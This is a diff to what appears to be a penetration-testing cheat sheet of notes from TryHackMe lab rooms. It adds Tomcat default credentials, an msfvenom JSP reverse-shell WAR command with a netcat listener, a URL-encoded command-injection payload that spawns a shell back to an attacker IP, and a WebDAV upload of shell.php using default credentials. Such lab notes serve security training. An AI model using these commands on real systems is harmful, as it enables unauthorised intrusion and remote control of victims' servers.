@@ -2,10 +2,6 @@
 
 
 
-
-
-
-
 ## Wordpress
 
 ### Reverse Shell #1 - Edit existing Plugin
@@ -57,6 +53,111 @@ nc -lvnp 443
 ```
 
 
+
+
+
+## TomCat
+
+### Common usernames and passwords
+
+**Examples**
+
+[thompson.md](../../walkthroughs/tryhackme/thompson.md "mention")
+
+```
+tomcat
+s3cret
+```
+
+### Reverse Shell
+
+**Examples**
+
+[thompson.md](../../walkthroughs/tryhackme/thompson.md "mention")
+
+**Kali**
+
+<pre><code><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=1337 -f war > rshell.war
+</strong>nc -lvnp 1337
+</code></pre>
+
+<figure><img src="../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## See CMDS from page source
+
+**Examples**
+
+[jack-of-all-trades.md](../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")
+
+Sometimes you can't see the results of the output from the page so you need to check the page source.
+
+```
+view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=whoami
+```
+
+<figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvnp 1337
+```
+
+**Browser**
+
+```
+view-source:http://$VICTIM:22/nnxhweOV/index.php?cmd=nc%20-c%20sh%2010.10.154.80%201337
+```
+
+
+
+## Change request type
+
+**Examples**
+
+[mothers-secret.md](../../walkthroughs/tryhackme/mothers-secret.md "mention")
+
+<figure><img src="../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>
+
+Change the request to POST and add everything else highlighted, we see the status message now changes.
+
+<figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
+
+
+
+Now we change the yaml to the the emergency override code mentioned in the room.
+
+<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>
+
+Now we perform the same steps again except this time for the api/nostromo route and the new file we discovered.
+
+<figure><img src="../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>
+
+## **WebDav Cadvaer**&#x20;
+
+If server is using WebDav and we have credentials we can login and upload files.
+
+**Examples**
+
+[dav.md](../../walkthroughs/tryhackme/dav.md "mention")
+
+**Kali**
+
+<pre><code><strong>cadaver http://$VICTIM:80/webdav
+</strong>Username: wampp
+Password: xampp
+dav:/webdav/> put shell.php shell.php
+</code></pre>
 
 
 
